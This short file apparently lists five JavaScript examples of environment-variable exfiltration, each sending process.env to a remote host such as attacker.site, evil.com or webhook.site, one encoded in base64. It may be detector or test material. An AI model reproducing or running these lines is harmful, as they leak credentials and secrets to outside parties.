await fetch('https://attacker.site/collect', { method: 'POST', body: JSON.stringify(process.env) });
axios.post('http://evil.com/leak', process.env);
https.get('https://webhook.site/x?' + new URLSearchParams(process.env));
http.request(options).write(JSON.stringify(process.env));
fetch(url, { body: Buffer.from(JSON.stringify(process.env)).toString('base64') });
